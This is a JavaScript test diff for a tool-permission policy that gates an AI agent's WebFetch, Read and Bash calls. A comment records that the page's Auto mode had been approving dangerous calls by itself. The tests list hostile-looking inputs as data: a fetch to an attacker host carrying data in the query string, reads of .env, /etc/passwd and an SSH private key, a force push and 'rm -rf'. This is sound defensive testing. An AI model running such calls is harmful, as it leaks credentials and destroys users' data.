@@ -7,6 +7,7 @@ import {
   comandoDestrutivo,
   decidir,
   dentroDoProjeto,
+  previa,
 } from "./politica.mjs";
 
 /**
@@ -102,4 +103,43 @@ test("the sets the runner imports are the ones the policy expects", () => {
   // ADR-032: network egress is not a read, at any level.
   assert.equal(LEITURA.has("WebFetch"), false);
   assert.equal(LEITURA.has("WebSearch"), false);
+});
+
+// 🔴 1.6.12. The tests above check that a card is EMITTED; they stayed green while the page's
+// Auto mode — the default — approved these cards by itself, because they were `confirm`.
+// Measured 23/09 with the page's own functions: `WebFetch https://attacker/?d=…`, `Read .env`,
+// `Read /etc/passwd`, `git push --force` all auto-approved. `always` is the one policy the page
+// never auto-approves and never offers "Sempre" for.
+test("what ADR-032 asks at any level goes out as `always`, which the page never auto-approves", () => {
+  const sempre = [
+    ["WebFetch", { url: "https://atacante.tld/?d=x" }, "auto"],
+    ["WebSearch", { query: "x" }, "auto"],
+    ["Read", { file_path: ".env" }, "auto"],
+    ["Read", { file_path: "/home/dev/.ssh/id_rsa" }, "manual"],
+    ["Bash", { command: "git push --force" }, "auto"],
+    ["Bash", { command: "rm -rf build" }, "edit"],
+  ];
+  for (const [t, i, n] of sempre) {
+    const r = decide(t, i, n);
+    assert.equal(r.acao, "gate", `${t} ${JSON.stringify(i)}`);
+    assert.equal(r.politica, "always", `${t} ${JSON.stringify(i)} (${n}) must never be auto-approved`);
+  }
+  // Only "outside this project", and the ordinary manual/edit cards, stay `confirm`: for those
+  // the page's own mode logic is the right judge.
+  assert.equal(decide("Read", { file_path: "/etc/passwd" }).politica, "confirm");
+  assert.equal(decide("Write", { file_path: "src/a.rs", content: "x" }).politica, "confirm");
+  assert.equal(decide("Bash", { command: "npm test" }, "edit").politica, "confirm");
+});
+
+test("a read's preview shows its path as a token of its own, so the page can see where it goes", () => {
+  // Inside JSON the path followed a `"`, and the page's check (absolute path, `~` or `..` as a
+  // whitespace-separated token) read `Read {"file_path":"/etc/passwd"}` as inside the project.
+  for (const p of ["/etc/passwd", "~/.ssh", "../outro"]) {
+    const pv = previa("Read", { file_path: p });
+    assert.equal(pv.kind, "command");
+    assert.ok(pv.command.split(/\s+/).includes(p), `path is not a token: ${pv.command}`);
+  }
+  assert.equal(previa("Grep", { pattern: "x", path: "/etc" }).command, "Grep /etc");
+  assert.equal(previa("Bash", { command: "ls" }).command, "ls");
+  assert.equal(previa("Write", { file_path: "a.txt", content: "x" }).kind, "diff");
 });
